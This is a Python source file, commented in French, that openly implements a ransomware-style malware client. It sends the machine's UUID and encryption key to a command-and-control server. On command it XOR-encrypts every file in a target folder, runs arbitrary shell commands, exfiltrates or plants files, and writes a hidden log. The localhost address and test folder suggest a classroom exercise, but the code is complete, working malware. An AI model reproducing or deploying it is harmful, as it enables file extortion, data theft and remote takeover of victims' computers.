import os       # Pour manipuler les fichiers et le système
import socket   # Pour la communication réseau avec le serveur 
import random   # Pour générer des éléments aléatoires
import string   # Pour manipuler les chaînes de caractères (lettres A-Z)
import datetime # Import pour l'horodatage des actions (Bonus Log)

# IP du serveur 
IP_SERVEUR = "127.0.0.1" 
# Port écouter par le serveur
PORT_SERVEUR = 9526

def ecrire_log_local(message):
    """ Enregistre les actions du malware localement de façon discrète """
    # Récupère l'heure actuelle
    temps = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    # Formate la ligne de log
    ligne = f"{temps} - {message}\n"
    # Utilisation d'un fichier caché (commence par un .) pour plus de discrétion sous Linux
    with open(".client_debug.log", "a") as f:
        f.write(ligne)

def obtenir_uuid_machine():
    # Ouvre le fichier système qui contient un UUID généré par Linux
    with open("/proc/sys/kernel/random/uuid", "r") as f:
        # Lit le contenu et enlève les espaces ou retours à la ligne avec .strip()
        return f.read().strip()

def generer_cle_chiffrement():
    # string.ascii_uppercase contient toutes les lettres de A à Z en majuscule
    lettres = string.ascii_uppercase
    # random.choice choisit une lettre au hasard 16 fois, puis .join les rassemble
    return ''.join(random.choice(lettres) for i in range(16))

def appliquer_xor(chemin_du_fichier, cle_texte):
    # Lecture en mode Binaire ("rb") pour accepter images, PDF, etc.
    with open(chemin_du_fichier, "rb") as f:
        donnees = f.read()
    
    # Transforme la clé texte en liste d'octets
    cle_octets = cle_texte.encode()
    # bytearray() crée une liste d'octets modifiable pour stocker le résultat
    resultat = bytearray()
    
    # On parcourt chaque octet (nombre entre 0 et 255) du fichier
    for i in range(len(donnees)):
        # L'opérateur ^ fait le calcul XOR entre l'octet du fichier et celui de la clé
        # le % (modulo) permet de recommencer la clé au début si le fichier est plus long
        resultat.append(donnees[i] ^ cle_octets[i % len(cle_octets)])
    
    # Réécriture en binaire ("wb") pour remplacer le contenu original
    with open(chemin_du_fichier, "wb") as f:
        f.write(resultat)

def gerer_fichiers(cle, nom_action):
    """ Parcourt récursivement le dossier cible pour chiffrer ou déchiffrer """
    # Lieu du dossier cible de l'attaque (~/Documents/CIBLE)
    dossier_cible = os.path.expanduser("~/Documents/CIBLE") 
    
    # Créer le dossier s'il n'existe pas
    if not os.path.exists(dossier_cible):
        os.makedirs(dossier_cible)

    # Créer un fichier témoin si le dossier est vide
    if not os.listdir(dossier_cible):
        fichier_temoin = os.path.join(dossier_cible, "coucou.txt")
        with open(fichier_temoin, "w") as f:
            f.write("Fichier cree pour le test de chiffrement.")
        
    nb_fichiers_impacte = 0
    # os.walk parcourt tout le dossier, ses sous-dossiers et ses fichiers
    for racine, dossiers, fichiers in os.walk(dossier_cible):
        for nom_f in fichiers:
            if nom_f.endswith(".py"):
                continue
            
            chemin_complet = os.path.join(racine, nom_f)
            try:
                appliquer_xor(chemin_complet, cle)
                nb_fichiers_impacte += 1
            except:
                pass
                
    return f"{nom_action} effectue sur {nb_fichiers_impacte} fichiers."

def demarrer_client():
    # Étape 1 : Récupération de l'UUID de la machine
    UUID_MACHINE = obtenir_uuid_machine()
    # Étape 2 : Génération de la clé de chiffrement (16 lettres A-Z)
    CLE_SESSION = generer_cle_chiffrement()
    
    # Log local du démarrage du malware
    ecrire_log_local(f"Initialisation du malware. UUID: {UUID_MACHINE} | CLE: {CLE_SESSION}")

    # Création du socket client pour se connecter au serveur 
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
        try:
            # Tente d'établir la connexion TCP avec le serveur
            client_socket.connect((IP_SERVEUR, PORT_SERVEUR))
            ecrire_log_local("Connexion etablie avec le serveur C2.")
        except Exception as e:
            # Log de l'échec de connexion avant de quitter
            ecrire_log_local(f"Erreur de connexion : {e}")
            return

        # Étape 3 : Exfiltration immédiate de l'ID et de la CLÉ vers le serveur
        message = f"UUID:{UUID_MACHINE} | CLE:{CLE_SESSION}"
        client_socket.sendall(message.encode())

        # Étape 4 : Le client attend les ordres du serveur dans une boucle
        while True:
            # Reçoit l'ordre envoyé par le serveur
            ordre = client_socket.recv(1024).decode()
            
            # Log de l'ordre recu
            if ordre:
                ecrire_log_local(f"Ordre recu du serveur : {ordre}")

            if ordre == "chiffrer":
                reponse = gerer_fichiers(CLE_SESSION, "Chiffrement")
                client_socket.sendall(reponse.encode())
                ecrire_log_local("Action chiffrer terminee avec succes.")

            elif ordre == "dechiffrer":
                reponse = gerer_fichiers(CLE_SESSION, "Dechiffrement")
                client_socket.sendall(reponse.encode())
                ecrire_log_local("Action dechiffrer terminee avec succes.")

            elif ordre == "system":
                cmd_a_faire = client_socket.recv(1024).decode()
                # Log de la commande systeme pour la tracabilite technique
                ecrire_log_local(f"Execution commande systeme : {cmd_a_faire}")
                sortie_console = os.popen(cmd_a_faire).read()
                client_socket.sendall(sortie_console.encode() if sortie_console else b"Succes")

            elif ordre == "download":
                nom_f = client_socket.recv(1024).decode()
                if os.path.exists(nom_f):
                    with open(nom_f, "rb") as f:
                        donnees = f.read()
                        client_socket.sendall(str(len(donnees)).encode().ljust(16))
                        client_socket.sendall(donnees)
                    ecrire_log_local(f"Exfiltration de fichier réussie : {nom_f}")
                else:
                    client_socket.sendall(b"ERREUR".ljust(16))
                    ecrire_log_local(f"Echec Download : {nom_f} introuvable.")

            elif ordre == "upload":
                nom_f = client_socket.recv(1024).decode()
                taille_data = client_socket.recv(16).decode().strip()
                donnees_recues = client_socket.recv(int(taille_data))
                with open(nom_f, "wb") as f:
                    f.write(donnees_recues)
                client_socket.sendall(b"Fichier bien recu par le client.")
                ecrire_log_local(f"Fichier recu via Upload : {nom_f}")

            elif ordre == "quitter":
                ecrire_log_local("Fermeture de la session demandee par le serveur.")
                break

            else:
                client_socket.sendall(b"Commande inconnue")
                ecrire_log_local(f"Alerte : Commande inconnue recue ({ordre})")
                
demarrer_client()
